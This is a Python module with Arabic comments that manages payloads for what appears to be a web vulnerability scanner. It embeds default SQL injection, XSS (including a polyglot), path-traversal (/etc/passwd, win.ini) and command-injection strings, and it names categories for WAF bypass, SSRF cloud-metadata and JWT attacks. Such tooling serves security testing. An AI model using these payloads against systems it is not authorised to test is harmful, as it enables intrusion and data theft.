"""
payload_manager.py
إدارة مركزية لجميع الـ Payloads
"""

import os
from pathlib import Path
from typing import List, Dict, Optional


class PayloadManager:
    """إدارة وتحميل جميع أنواع الـ Payloads"""
    
    def __init__(self, payloads_dir: str = "payloads"):
        self.payloads_dir = Path(payloads_dir)
        self.payloads_cache = {}
        self.load_all_payloads()
    
    def load_all_payloads(self):
        """تحميل جميع الـ Payloads من المجلدات"""
        try:
            payload_categories = {
                'sqli': ['union_based', 'error_based', 'boolean_based', 'time_based', 
                        'mysql', 'postgresql', 'mssql', 'oracle', 'sqlite'],
                'xss': ['reflected', 'stored', 'dom_based', 'polyglot', 'filter_bypass', 'waf_bypass'],
                'lfi': ['linux_lfi', 'windows_lfi', 'null_byte', 'wrapper_lfi', 'log_poisoning'],
                'rce': ['linux_commands', 'windows_commands', 'blind_rce', 'time_based_rce'],
                'xxe': ['xxe_basic', 'xxe_oob', 'xxe_blind'],
                'ssrf': ['ssrf_basic', 'cloud_metadata', 'ssrf_bypass'],
                'template_injection': ['jinja2', 'twig', 'smarty', 'thymeleaf'],
                'nosql': ['mongodb', 'couchdb', 'redis'],
                'misc': ['open_redirect', 'csrf_payloads', 'idor_patterns', 'jwt_attacks']
            }
            
            for category, files in payload_categories.items():
                category_path = self.payloads_dir / category
                
                # إنشاء المجلد إذا لم يكن موجوداً
                if not category_path.exists():
                    category_path.mkdir(parents=True, exist_ok=True)
                
                self.payloads_cache[category] = {}
                
                for file_name in files:
                    file_path = category_path / f"{file_name}.txt"
                    
                    if file_path.exists():
                        with open(file_path, 'r', encoding='utf-8') as f:
                            payloads = [line.strip() for line in f 
                                      if line.strip() and not line.startswith('#')]
                            self.payloads_cache[category][file_name] = payloads
                    else:
                        # إنشاء ملف فارغ إذا لم يكن موجوداً
                        self.payloads_cache[category][file_name] = self._get_default_payloads(category, file_name)
            
            print(f"✅ Loaded {sum(len(v) for v in self.payloads_cache.values())} payload categories")
            
        except Exception as e:
            print(f"❌ Error loading payloads: {str(e)}")
    
    def _get_default_payloads(self, category: str, payload_type: str) -> List[str]:
        """الحصول على payloads افتراضية"""
        defaults = {
            'sqli': {
                'union_based': ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "1' UNION SELECT NULL--"],
                'error_based': ["'", "\"", "1'", "1\""],
                'boolean_based': ["' AND '1'='1", "' AND '1'='2", "' OR '1'='1"],
                'time_based': ["' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--"]
            },
            'xss': {
                'reflected': ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>"],
                'stored': ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"],
                'polyglot': ["jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e"]
            },
            'lfi': {
                'linux_lfi': ["../../../etc/passwd", "../../../../etc/passwd", "../../../../../etc/passwd"],
                'windows_lfi': ["..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "..\\..\\..\\..\\windows\\win.ini"]
            },
            'rce': {
                'linux_commands': ["; ls", "| ls", "`ls`", "$(ls)", "; whoami", "| whoami"],
                'windows_commands': ["& dir", "| dir", "& whoami", "| whoami"]
            }
        }
        
        return defaults.get(category, {}).get(payload_type, ["test"])
    
    def get_payloads(self, vuln_type: str, specific_type: Optional[str] = None) -> List[str]:
        """
        الحصول على payloads لنوع ثغرة معين
        
        Args:
            vuln_type: نوع الثغرة (sqli, xss, lfi, etc)
            specific_type: نوع محدد (مثل: union_based, reflected, etc)
        """
        try:
            if vuln_type not in self.payloads_cache:
                return []
            
            if specific_type:
                return self.payloads_cache[vuln_type].get(specific_type, [])
            
            # إرجاع جميع payloads من الفئة
            all_payloads = []
            for payloads_list in self.payloads_cache[vuln_type].values():
                all_payloads.extend(payloads_list)
            return all_payloads
            
        except Exception as e:
            print(f"❌ Error getting payloads: {str(e)}")
            return []
    
    def add_custom_payload(self, vuln_type: str, payload: str):
        """إضافة payload مخصص"""
        try:
            if vuln_type not in self.payloads_cache:
                self.payloads_cache[vuln_type] = {'custom': []}
            
            if 'custom' not in self.payloads_cache[vuln_type]:
                self.payloads_cache[vuln_type]['custom'] = []
            
            self.payloads_cache[vuln_type]['custom'].append(payload)
            
        except Exception as e:
            print(f"❌ Error adding payload: {str(e)}")
    
    def get_polyglot_payloads(self) -> List[str]:
        """الحصول على Polyglot Payloads (تعمل في سياقات متعددة)"""
        return self.get_payloads('xss', 'polyglot')
    
    def get_waf_bypass_payloads(self, vuln_type: str) -> List[str]:
        """الحصول على payloads لتجاوز WAF"""
        bypass_payloads = self.get_payloads(vuln_type, 'waf_bypass')
        if not bypass_payloads:
            bypass_payloads = self.get_payloads(vuln_type, 'filter_bypass')
        return bypass_payloads
    
    def count_payloads(self, vuln_type: Optional[str] = None) -> int:
        """عد الـ Payloads"""
        if vuln_type:
            return sum(len(payloads) for payloads in self.payloads_cache.get(vuln_type, {}).values())
        return sum(
            sum(len(payloads) for payloads in category.values())
            for category in self.payloads_cache.values()
        )
    
    def get_available_categories(self) -> List[str]:
        """الحصول على الفئات المتاحة"""
        return list(self.payloads_cache.keys())